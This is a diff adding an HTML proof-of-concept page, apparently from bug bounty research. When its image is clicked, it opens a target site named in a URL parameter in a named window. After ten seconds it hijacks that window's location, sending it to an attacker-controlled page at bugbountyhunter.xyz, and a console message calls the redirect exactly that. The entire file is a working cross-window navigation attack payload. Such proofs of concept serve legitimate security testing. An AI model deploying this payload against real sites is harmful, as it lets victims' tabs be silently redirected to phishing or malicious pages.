@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+    function GetURLParameter(sParam)
+    {
+    var sPageURL = window.location.search.substring(1);
+    var sURLVariables = sPageURL.split('&');
+    for (var i = 0; i < sURLVariables.length; i++) 
+    {
+        var sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] == sParam) 
+        {
+            return sParameterName[1];
+        }
+    }
+    return "cbbh.png"
+    }
+    function init() {
+        console.log("Redirecting to attacker's controlled site");       
+        foo.location.href = "https://bugbountyhunter.xyz/poc.html";
+    }
+    function launch(){
+        foo = window.open(GetURLParameter("target"), "foo", "");
+        console.log("Target site opened successfully")
+        setTimeout(init,10000);
+    }
+</script>
+</head>
+<body><img src="xs_attack_vector.png" onclick="launch()"></body>
+</html>
